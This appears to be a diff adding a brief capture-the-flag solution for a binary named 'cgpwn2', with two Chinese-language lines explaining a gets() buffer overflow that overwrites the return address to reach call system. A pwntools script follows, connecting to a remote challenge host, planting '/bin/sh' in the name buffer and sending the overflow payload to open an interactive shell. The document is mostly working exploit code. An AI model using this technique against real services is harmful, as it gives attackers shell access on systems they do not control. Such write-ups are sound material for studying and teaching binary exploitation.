@@ -1,0 +1,9 @@
+后面一个gets(）可以溢出，覆盖返回地址，直接到call system
+需要一个参数，在溢出的返回地址后面填上参数所在的地址，name就可以。
+
+from pwn import *
+p = process("./cgpwn2")
+p = remote("111.198.29.45", 31695)
+p.sendafter("name\n","/bin/sh\n")
+p.sendafter("here:\n","x"*0x26+"abcd"+p32(0x0804855a)+p32(0x0804a080)+"\n")
+p.interactive()
